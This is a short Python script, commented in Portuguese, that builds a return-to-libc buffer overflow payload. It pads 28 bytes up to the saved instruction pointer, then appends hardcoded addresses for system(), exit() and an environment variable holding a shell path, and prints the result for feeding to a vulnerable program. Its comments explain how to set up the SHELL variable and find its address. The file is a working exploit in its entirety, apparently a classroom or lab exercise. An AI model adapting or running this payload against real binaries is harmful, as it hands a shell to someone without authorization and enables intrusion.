#!/usr/bin/python
#
#Antes de usar 
#exporte a variavel export SHELL=/bin/bash
#utilize cacth SHELL para pegar o endereco
#use o endereco da string
#ENDERECOS:
#system() -> 0x400644a0
#exit() ->0x4004d501
#variavel SHELL -> 0xbffff9cf



#system() function address in the system
SYSTEM_ADDR =  "\xa0\x44\x06\x40"

#exit() function address in the system
EXIT_ADDR   =  "\x01\xd5\x04\x40"

#address of SHELL = "/bin/sh"
BASH_STRING =  "\xcf\xf9\xff\xbf"

#trash until stop in the EIP 
buffer = "a"*28

buffer = buffer + SYSTEM_ADDR + EXIT_ADDR + BASH_STRING

print buffer

